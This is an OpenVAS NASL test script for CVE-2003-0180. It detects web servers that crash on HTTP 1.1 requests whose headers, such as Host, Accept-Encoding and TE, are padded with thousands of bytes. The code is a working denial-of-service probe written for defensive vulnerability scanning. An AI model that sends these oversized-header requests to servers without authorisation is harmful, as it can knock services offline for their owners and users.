# OpenVAS Vulnerability Test
# $Id: www_too_long_header11.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: HTTP 1.1 header overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to kill the web server by
sending an invalid request with a too long HTTP 1.1 header
(Accept-Encoding, Accept-Language, Accept-Range, Connection, 
Expect, If-Match, If-None-Match, If-Range, If-Unmodified-Since,
Max-Forwards, TE, Host)

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.";

tag_solution = "upgrade your software or protect it with a filtering reverse proxy";

# I don't even know if it crashes any web server...
# Cf. RFC 2068
#
# Vulnerable servers (not tested)
#
# Domino < 6.0.1
# From: "NGSSoftware Insight Security Research" <nisr@nextgenss.com>
# Subject: Lotus Domino Web Server Host/Location Buffer Overflow Vulnerability (#NISR17022003a)
# To: <bugtraq@securityfocus.com>, <vulnwatch@vulnwatch.org>,
#    <ntbugtraq@listserv.ntbugtraq.com>
# Date: Mon, 17 Feb 2003 16:19:20 -0800
#
# From: "Matthew Murphy" <mattmurphy@kc.rr.com>
# Subject: Multiple pServ Remote Buffer Overflow Vulnerabilities
# To: "BugTraq" <bugtraq@securityfocus.com>
# Date: Sun, 1 Dec 2002 12:15:52 -0600

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.11129");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2003-0180");
 script_bugtraq_id(6951);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 name = "HTTP 1.1 header overflow";
 script_name(name);
 

 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before OpenVAS
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Gain a shell remotely";
 script_family(family);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nasl", "httpver.nasl", "http_version.nasl");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

########

include("http_func.inc");


port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

r = string("GET / HTTP/1.1\r\nHost: ", crap(1024), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_message(port); exit(0); }
#
#
r1 = string("GET / HTTP/1.1\r\nHost: ", get_host_name(), "\r\n");
#
r = string(r1, "Accept-Encoding: ", crap(4096), "compress, *\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_message(port); exit(0); }

r = string(r1, "Accept-Language: en, ", crap(4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_message(port); exit(0); }

r = string(r1, "Accept-Range: ",crap(data: "bytes", length: 4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_message(port); exit(0); }

r = string(r1, "Connection: ", crap(data: "close", length: 4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_message(port); exit(0); }

r = string(r1, "Expect: ", crap(4096), "=",crap(4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_message(port); exit(0); }

r = string(r1, "If-Match: ", crap(4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  {  security_message(port); exit(0); }

r = string(r1, "If-None-Match: ", crap(4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_message(port); exit(0); }

r = string(r1, "If-Range: ", crap(4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_message(port); exit(0); }

r = string(r1, "If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 ", 
	crap(data: "GMT", length: 1024), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_message(port); exit(0); }

r = string(r1, "Max-Forwards: ", crap(data: "6", length: 4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_message(port); exit(0); }

r = string(r1, "TE: deflate, ", crap(4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
if (http_is_dead(port: port)) { security_message(port); exit(0); }
